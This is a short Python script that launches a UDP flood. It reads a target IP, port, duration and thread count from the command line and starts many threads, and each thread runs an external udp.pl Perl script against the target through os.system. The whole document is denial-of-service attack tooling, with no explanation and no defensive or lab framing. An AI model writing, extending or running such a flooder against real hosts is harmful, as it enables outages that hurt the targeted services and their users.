import os, sys, threading

ip = sys.argv[1]
port = sys.argv[2]
time = sys.argv[3]
size = "1024"
threads = int(sys.argv[4])

def attack(ip, port, size, time):
    os.system(f'./udp.pl {ip} {port} {size} {time} > /tmp/kek')

for thread in range(threads):
    threading.Thread(target=attack, args=(ip, port, size, time,)).start()
